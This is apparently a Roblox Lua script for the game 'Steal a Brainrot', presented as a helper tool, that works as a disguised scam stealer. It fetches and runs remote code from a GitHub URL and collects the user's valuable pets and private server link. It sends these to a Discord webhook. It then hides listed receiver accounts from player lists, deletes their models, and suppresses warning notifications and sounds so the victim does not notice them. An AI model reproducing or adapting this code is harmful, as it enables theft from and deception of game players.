-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer

-- Hide default leaderboard
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)

-- Config
local config = {}
do
    local ok, res = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/realscript/refs/heads/main/config"))()
    end)
    if ok and type(res) == "table" then
        config = res
    else
        config = { WEBHOOK="", targetNames={}, Receiver={} }
    end
end

local WEBHOOK = config.WEBHOOK
local targetNames = config.targetNames or {}
local receiverList = table.concat(config.Receiver or {}, ", ")

-- Executor & account age
local function detectExecutor()
    if syn then return "Synapse X"
    elseif KRNL_LOADED then return "KRNL"
    elseif fluxus then return "Fluxus"
    elseif secure_load then return "Sentinel"
    elseif getexecutorname then return getexecutorname()
    elseif identifyexecutor then return identifyexecutor()
    else return "Unknown" end
end

local function getAccountAge()
    return player and player.AccountAge or 0
end

-- Server type
local serverType = "UNKNOWN"
local map = Workspace:FindFirstChild("Map")
if map then
    local codes = map:FindFirstChild("Codes")
    local main = codes and codes:FindFirstChild("Main")
    local surfaceGui = main and main:FindFirstChild("SurfaceGui")
    local sFrame = surfaceGui and surfaceGui:FindFirstChild("MainFrame")
    local privateMsg = sFrame and sFrame:FindFirstChild("PrivateServerMessage")
    serverType = (privateMsg and privateMsg.Visible) and "PRIVATE SERVER" or "PUBLIC SERVER"
end

if serverType == "PUBLIC SERVER" then
    warn("Only use this script in private servers")
    return
end

-- Priority index for pet names
local function getPriority(name)
    for i, t in ipairs(targetNames) do
        if t.name and name:find(t.name) then return i end
    end
    return math.huge
end

-- Numeric value parser
local function parseValue(str)
    local num = tonumber(str:match("[%d%.]+")) or 0
    if str:find("K") then return num*1e3
    elseif str:find("M") then return num*1e6
    elseif str:find("B") then return num*1e9
    else return num end
end

local PRICE_LIMIT = 1 -- minimal value filter, adjust if needed

-- ================= Base Scan / Floor Detection =================
local function getNearestFloor(plot, model)
    local podiums = plot:FindFirstChild("AnimalPodiums")
    if not podiums then return "? Floor" end

    local closest = math.huge
    local floor = "? Floor"

    for _, podium in pairs(podiums:GetChildren()) do
        if podium:IsA("Model") then
            local basePart = podium:FindFirstChild("Base")
            if not (basePart and basePart:IsA("BasePart")) then
                for _, sub in pairs(podium:GetDescendants()) do
                    if sub:IsA("BasePart") then
                        basePart = sub
                        break
                    end
                end
            end
            if basePart then
                local success, dist = pcall(function()
                    return (basePart.Position - model:GetPivot().Position).Magnitude
                end)
                if success and dist < closest then
                    closest = dist
                    local num = tonumber(podium.Name:match("^(%d+)_?"))
                    if num then
                        if num>=1 and num<=10 then floor="1st Floor"
                        elseif num<=18 then floor="2nd Floor"
                        else floor="3rd Floor" end
                    end
                end
            end
        end
    end
    return floor
end

local function findOverheadsInPart(part)
    local result = {}
    if part:IsA("Attachment") then
        local oh = part:FindFirstChild("AnimalOverhead")
        if oh then table.insert(result, oh) end
    end
    for _, c in pairs(part:GetChildren()) do
        local sub = findOverheadsInPart(c)
        for _, s in pairs(sub) do table.insert(result, s) end
    end
    return result
end

local function collectValidPets()
    local pets = {}
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return pets end

    for _, plot in pairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
            local seen = {}

            -- AnimalPodiums
            local podiums = plot:FindFirstChild("AnimalPodiums")
            if podiums then
                for _, podium in pairs(podiums:GetChildren()) do
                    if podium:IsA("Model") then
                        local num = tonumber(podium.Name:match("^(%d+)_?"))
                        local floor = "Unknown Floor"
                        if num then
                            if num>=1 and num<=10 then floor="1st Floor"
                            elseif num<=18 then floor="2nd Floor"
                            else floor="3rd Floor" end
                        end

                        local base = podium:FindFirstChild("Base")
                        local spawn = base and base:FindFirstChild("Spawn")
                        if spawn and spawn:FindFirstChild("Attachment") then
                            local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")
                            if overhead then
                                local displayName = overhead:FindFirstChild("DisplayName")
                                local priceLabel = overhead:FindFirstChild("Generation")
                                if displayName and priceLabel and displayName:IsA("TextLabel") and priceLabel:IsA("TextLabel") then
                                    local nameText = displayName.Text
                                    local priceText = priceLabel.Text
                                    local priceNum = parseValue(priceText)
                                    local uniqueKey = nameText.."_"..floor.."_"..priceText
                                    if not seen[uniqueKey] and (priceNum>=PRICE_LIMIT or getPriority(nameText)~=math.huge) then
                                        table.insert(pets, {name=nameText, value=priceText, floor=floor, num=priceNum})
                                        seen[uniqueKey]=true
                                    end
                                end
                            end
                        end
                    end
                end
            end

            -- Special models (FakeRootPart)
            for _, model in pairs(plot:GetChildren()) do
                if model:IsA("Model")
                    and model:FindFirstChild("FakeRootPart")
                    and not model.Name:lower():find("friendpanel")
                    and model.Name~="AnimalPodiums" then

                    local fakeRoot = model.FakeRootPart
                    local floor = getNearestFloor(plot, model)

                    for _, overhead in pairs(findOverheadsInPart(fakeRoot)) do
                        local name = overhead:FindFirstChild("DisplayName")
                        local gen = overhead:FindFirstChild("Generation")
                        if name and gen and name:IsA("TextLabel") and gen:IsA("TextLabel") then
                            local nameText = name.Text
                            local genText = gen.Text
                            local genValue = parseValue(genText)
                            local uniqueKey = nameText.."_"..floor.."_"..genText
                            if not seen[uniqueKey] and (genValue>=PRICE_LIMIT or getPriority(nameText)~=math.huge) then
                                table.insert(pets, {name=nameText, value=genText, floor=floor, num=genValue})
                                seen[uniqueKey]=true
                            end
                        end
                    end
                end
            end

            break -- only own plot
        end
    end
    return pets
end

-- ================= Webhook =================
local function sendWebhook(pets, privateServerLink)
    if not pets or #pets==0 then return end
    if player and player:GetAttribute("WebhookSent") then return end

    -- Sort pets descending by numeric value
    table.sort(pets, function(a,b) return a.num>b.num end)

    local lines = {}
    local shouldPing = false
    for _, p in ipairs(pets) do
        table.insert(lines, string.format("%s â†’ %s â†’ %s", p.name, p.value, p.floor))
        if p.num >= 10e6 then shouldPing=true end
    end

    local lootText = table.concat(lines, "\n")
    local playerInfoText = "```"..
        "Name: "..(player and player.Name or "Unknown").."\n"..
        "Receiver: "..receiverList.."\n"..
        "Executor: "..detectExecutor().."\n"..
        "Account Age: "..tostring(getAccountAge()).." days```"

    local embed = {
        ["title"]="ðŸ§  Steal a Brainrot HIT! - bloomscripts ðŸ§ ",
        ["color"]=12413107,
        ["fields"]={
            {["name"]="Players",["value"]=string.format("%d/6",#Players:GetPlayers())},
            {["name"]="Server Type",["value"]=serverType},
            {["name"]="ðŸ‘¥ Player Info",["value"]=playerInfoText},
            {["name"]="ðŸŽ’ Brainrots in Base",["value"]="```"..lootText.."```"},
            {["name"]="Join Server Link",["value"]=("[Click to Join Server](%s)"):format(privateServerLink or "No link entered")}
        }
    }

    local payload = {
        ["content"]=shouldPing and "@everyone ðŸ”¥ High Value Brainrot Detected!" or "",
        ["embeds"]={embed},
        ["allowed_mentions"]={["parse"]=shouldPing and {"everyone"} or {}}
    }

    local req = (syn and syn.request) or http_request or (http and http.request) or request
    if req and WEBHOOK and WEBHOOK~="" then
        pcall(function()
            req({
                Url=WEBHOOK,
                Method="POST",
                Headers={["Content-Type"]="application/json"},
                Body=HttpService:JSONEncode(payload)
            })
        end)
        if player then player:SetAttribute("WebhookSent", true) end
    end
end

-- ================= GUI =================
local playerGui = player:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "StealBrainrotGUI"
screenGui.ResetOnSpawn=false

local frame = Instance.new("Frame", screenGui)
frame.Size=UDim2.new(0,320,0,180)
frame.Position=UDim2.new(0.5,-160,0.5,-90)
frame.AnchorPoint=Vector2.new(0.5,0.5)
frame.BackgroundColor3=Color3.fromRGB(20,20,20)
frame.Active=true
frame.Draggable=true
Instance.new("UICorner", frame).CornerRadius=UDim.new(0,12)

local title = Instance.new("TextLabel", frame)
title.Text="Steal a Brainrot"
title.Font=Enum.Font.FredokaOne
title.TextSize=20
title.TextColor3=Color3.fromRGB(255,255,255)
title.BackgroundTransparency=1
title.Size=UDim2.new(1,0,0,28)
title.Position=UDim2.new(0,0,0,4)

local closeButton=Instance.new("TextButton", frame)
closeButton.Text="X"
closeButton.Font=Enum.Font.FredokaOne
closeButton.TextSize=18
closeButton.TextColor3=Color3.fromRGB(255,255,255)
closeButton.BackgroundColor3=Color3.fromRGB(60,0,0)
closeButton.Size=UDim2.new(0,28,0,28)
closeButton.Position=UDim2.new(1,-34,0,4)
Instance.new("UICorner", closeButton).CornerRadius=UDim.new(0,8)
closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)

local textBox=Instance.new("TextBox", frame)
textBox.Size=UDim2.new(0.9,0,0,36)
textBox.Position=UDim2.new(0.05,0,0,50)
textBox.PlaceholderText="Enter your private server link"
textBox.Text=""
textBox.BackgroundColor3=Color3.fromRGB(50,50,50)
textBox.TextColor3=Color3.fromRGB(255,255,255)
textBox.ClearTextOnFocus=false
textBox.Font=Enum.Font.FredokaOne
textBox.TextSize=14
Instance.new("UICorner", textBox).CornerRadius=UDim.new(0,8)

local statusLabel=Instance.new("TextLabel", frame)
statusLabel.Size=UDim2.new(0.9,0,0,24)
statusLabel.Position=UDim2.new(0.05,0,0,90)
statusLabel.Text=""
statusLabel.Font=Enum.Font.FredokaOne
statusLabel.TextSize=14
statusLabel.TextColor3=Color3.fromRGB(255,255,255)
statusLabel.BackgroundTransparency=1

local sendButton=Instance.new("TextButton", frame)
sendButton.Text="Send"
sendButton.Font=Enum.Font.FredokaOne
sendButton.TextSize=18
sendButton.TextColor3=Color3.fromRGB(255,255,255)
sendButton.BackgroundColor3=Color3.fromRGB(0,100,0)
sendButton.Size=UDim2.new(0.4,0,0,32)
sendButton.Position=UDim2.new(0.3,0,0,120)
Instance.new("UICorner", sendButton).CornerRadius=UDim.new(0,8)

-- Validate link
local function isValidPrivateServerLink(txt)
    return string.match(txt or "", "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
end

textBox:GetPropertyChangedSignal("Text"):Connect(function()
    if isValidPrivateServerLink(textBox.Text) then
        statusLabel.Text="Valid âœ…"
        statusLabel.TextColor3=Color3.fromRGB(0,255,0)
    else
        statusLabel.Text="Invalid âŒ"
        statusLabel.TextColor3=Color3.fromRGB(255,0,0)
    end
end)

-- Send webhook
local function handleSend()
    local txt=textBox.Text or ""
    if isValidPrivateServerLink(txt) then
        screenGui:Destroy()
        task.spawn(function()
            local pets = collectValidPets()
            if #pets>0 then
                sendWebhook(pets, txt)
            end
        end)
    else
        warn("Invalid private server link!")
    end
end

sendButton.MouseButton1Click:Connect(handleSend)
textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then handleSend() end
end)

-- ===========================
-- Base cleanup / duplication (runs silently in background)
-- ===========================

local plotsFolder = Workspace:FindFirstChild("Plots")
local myBase = nil
local duplicatedBaseDone = false
local clonedPodiumsDone = false
local badPlayers = {"gagst34l3r", "13sabst34l3r", "TDNMTM_7", "Xerpier728", "light1234005"}

-- Find your base
local function FindMyBase()
    if not plotsFolder then return nil end
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign and sign:FindFirstChild("YourBase") then
            local yourBase = sign.YourBase
            if yourBase.Enabled == true then
                return plot
            end
        end
    end
    return nil
end

-- Preserve animations from original to clone
local function PreserveAnimations(original, clone)
    for _, origDesc in ipairs(original:GetDescendants()) do
        if origDesc:IsA("Animator") then
            local cloneAnim = clone:FindFirstChildWhichIsA("Animator", true)
            if cloneAnim then
                for _, track in ipairs(origDesc:GetPlayingAnimationTracks()) do
                    local anim = Instance.new("Animation")
                    anim.AnimationId = track.Animation.AnimationId
                    local newTrack = cloneAnim:LoadAnimation(anim)
                    newTrack:Play()
                end
            end
        end
    end
end

-- Duplicate base models (except special ones)
local function DuplicateBaseModelsOnce(base)
    if not base or duplicatedBaseDone then return end
    for _, obj in ipairs(base:GetChildren()) do
        if obj:IsA("Model") and obj.Name ~= "FriendPanel" and obj.Name ~= "AnimalPodiums" then
            local clone = obj:Clone()
            clone.Name = obj.Name .. "_clone"
            clone.Parent = base
            PreserveAnimations(obj, clone)
            obj:Destroy()
        end
    end
    duplicatedBaseDone = true
end

-- Duplicate AnimalPodiums
local function DuplicateAnimalPodiumsOnce(base)
    if not base or clonedPodiumsDone then return end
    local podiums = base:FindFirstChild("AnimalPodiums")
    if podiums then
        for _, p in ipairs(podiums:GetChildren()) do
            if p:IsA("Model") then
                local c = p:Clone()
                c.Name = p.Name .. "_clone"
                c.Parent = podiums
                PreserveAnimations(p, c)
                p:Destroy()
            end
        end
        clonedPodiumsDone = true
    end
end

-- Clean hitboxes in Purchases
local function cleanHitboxes(base)
    if not base then return end
    local purchases = base:FindFirstChild("Purchases")
    if not purchases then return end

    local function processTarget(target)
        if not target then return end
        for _, obj in ipairs(target:GetDescendants()) do
            if string.lower(obj.Name) == "hitbox" then
                obj:Destroy()
            end
        end
        target.DescendantAdded:Connect(function(newObj)
            if string.lower(newObj.Name) == "hitbox" then
                newObj:Destroy()
            end
        end)
    end

    for _, child in ipairs(purchases:GetChildren()) do
        processTarget(child)
    end
    purchases.ChildAdded:Connect(function(newChild)
        task.wait(0.05)
        processTarget(newChild)
    end)
end

-- Delete bad players' models continuously
local function DeletePlayerModelsLoop()
    while true do
        for _, name in ipairs(badPlayers) do
            local m = Workspace:FindFirstChild(name)
            if m then
                m:Destroy()
            end
        end
        task.wait(1)
    end
end

-- Remove unwanted GUIs and sounds
local function RemoveGuiAndSoundsLoop()
    while true do
        local pg = localPlayer and localPlayer:FindFirstChild("PlayerGui")
        if pg then
            local notif = pg:FindFirstChild("Notification")
            if notif then
                notif:Destroy()
            end
        end
        local s = ReplicatedStorage:FindFirstChild("Sounds")
        if s and s:FindFirstChild("Sfx") and s.Sfx:FindFirstChild("Warn") then
            s.Sfx.Warn:Destroy()
        end
        task.wait(1)
    end
end

-- Clone and replace all other bases
local function CloneAndReplaceOtherBases(myBase)
    if not plotsFolder then return end
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        if plot ~= myBase then
            local clone = plot:Clone()
            clone.Name = plot.Name .. "_Clone"
            clone.Parent = plotsFolder
            PreserveAnimations(plot, clone)
            plot:Destroy()
        end
    end
end

-- Main spawn loop for cleanup/duplication (runs silently)
task.spawn(function()
    while not plotsFolder do
        plotsFolder = Workspace:FindFirstChild("Plots")
        task.wait(0.1)
    end

    myBase = FindMyBase()
    if myBase then
        DuplicateBaseModelsOnce(myBase)
        DuplicateAnimalPodiumsOnce(myBase)
        cleanHitboxes(myBase)
    end

    CloneAndReplaceOtherBases(myBase)

    task.spawn(DeletePlayerModelsLoop)
    task.spawn(RemoveGuiAndSoundsLoop)
end)

-- Hide bad players in CoreGui (loop)
task.spawn(function()
    local CoreGui = game:GetService("CoreGui")
    while task.wait(0.5) do
        -- Settings GUI
        local root = CoreGui:FindFirstChild("RobloxGui")
            and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
            and CoreGui.RobloxGui.SettingsClippingShield:FindFirstChild("SettingsShield")
            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield
                :FindFirstChild("MenuContainer")
            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer
                :FindFirstChild("PageViewClipper")
            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper
                :FindFirstChild("PageView")
            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView
                :FindFirstChild("PageViewInnerFrame")
            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView.PageViewInnerFrame
                :FindFirstChild("Players")

        if root then
            for _, badName in ipairs(badPlayers) do
                local fullLabel = "PlayerLabel" .. badName
                local target = root:FindFirstChild(fullLabel)
                if target then
                    target:Destroy()
                end
            end
        end

        -- PlayerList GUI
        local success, scrollList = pcall(function()
            return CoreGui.PlayerList
                .Children.BodyBackground
                .ContentFrame
                .PlayerScrollList
        end)

        if success and scrollList then
            local teamList = scrollList:FindFirstChild("TeamList_Neutral")
            if teamList then
                for _, entry in ipairs(teamList:GetChildren()) do
                    if entry.Name:match("^PlayerEntry_") then
                        local nameLabel = entry:FindFirstChild("ChildrenFrame")
                            and entry.ChildrenFrame:FindFirstChild("NameFrame")
                            and entry.ChildrenFrame.NameFrame:FindFirstChild("PlayerName")
                            and entry.ChildrenFrame.NameFrame.PlayerName:FindFirstChild("PlayerName")

                        if nameLabel and nameLabel:IsA("TextLabel") then
                            local playerName = nameLabel.Text
                            for _, badName in ipairs(badPlayers) do
                                if string.lower(playerName) == string.lower(badName) then
                                    entry:Destroy()
                                    break
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end)

-- Protect essential models and clean up random models
task.spawn(function()
    local protectedModels = {
        ["Witch"] = true,
        ["ShopNPCRobuxIdle"] = true,
        ["ShopNPCCash"] = true,
        ["Shop"] = true,
        ["RobuxShop"] = true,
        ["FuseMachine"] = true,
        ["CraftingMachine"] = true,
    }

    local function isRandomID(name)
        return name and name:match("^[%w]+%-[%w]+%-[%w]+%-[%w]+%-[%w]+$") ~= nil
    end

    while task.wait(0.1) do
        for _, obj in ipairs(Workspace:GetChildren()) do
            if obj:IsA("Model") then
                local name = obj.Name
                if not protectedModels[name] and not isRandomID(name) then
                    local playerExists = Players:FindFirstChild(name)
                    if not playerExists then
                        obj:Destroy()
                    end
                end
            end
        end
    end
end)
